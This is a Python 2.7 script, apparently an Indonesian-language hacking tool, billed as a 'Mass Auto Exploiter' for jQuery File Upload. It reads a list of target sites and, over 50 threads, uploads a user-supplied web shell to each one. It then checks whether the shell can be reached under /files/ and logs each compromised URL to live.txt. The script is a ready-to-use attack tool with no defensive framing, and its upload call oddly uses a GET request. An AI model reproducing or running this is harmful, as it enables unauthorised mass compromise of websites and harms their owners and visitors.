#Python2.7

import os,sys,json,time
import threading
import requests
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
blue = '\033[96m'
purple = '\033[95m'
reset = '\033[0m'

if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')
pass
print("___  ____ ___      _ ____ _  _ ")
print("|__] |  |  |       | |___ |  | ")
print("|__] |__|  |     __| |    |__| ")
print(blue+"Mass Auto Exploiter jQuery File Upload"+reset)

shell = raw_input(green+"[ + ]"+reset+" Masukan Shell : "+blue+reset)

def error():
	try:
		requests.post('http://www.google.com')
		open(sys.argv[1], 'rb')
	except requests.exceptions.ConnectionError:
		print(red+"[ - ]"+reset+" Tidak Ada Koneksi Internet")
		exit()
	except IOError:
		print(red+"[ - ]"+reset+" File Tidak Di Temukan!")
		exit()
	except IndexError:
		print(red+"[ - ]"+reset+" Usage : python2 file.py list.txt")
		exit()
error()
def proc(url):
	web = url.replace('www.','').replace('http://','').replace('https://','')
	files = {'files': (shell, open(shell, 'rb'))}
	response = requests.get('http://'+web+'/', files=files, headers={"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)"})
	if  response.status_code != 200:
			print(red+"http://"+web+reset+" --> Not Vuln")
	else:
		r = requests.get('http://'+web+"/files/"+shell, headers={"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 (.NET CLR 3.5.30729)"}, allow_redirects=False)
		if r.status_code != 200:
			print(yellow+"http://"+web+"/files"+shell+reset+" --> Shell Not Found")
		else:
			parsing_json = json.loads(response.text)
			name_shell = parsing_json['files'][0]['name']
			print(green+"http://"+web+"/files"+name_shell+reset+" --> Exploit Success")
			with open('live.txt', 'ab') as results:
				results.write('http://'+web+"/files/"+name_shell+"\n")
				results.close()
		pass

lists = open(sys.argv[1], 'r').read().splitlines()
t = ThreadPool(50)
t.map(proc, lists)
t.close()
if __name__ == "__main__":
	print(green+"Save File : live.txt")
	print(blue+"Tools by Sterben404"+reset)
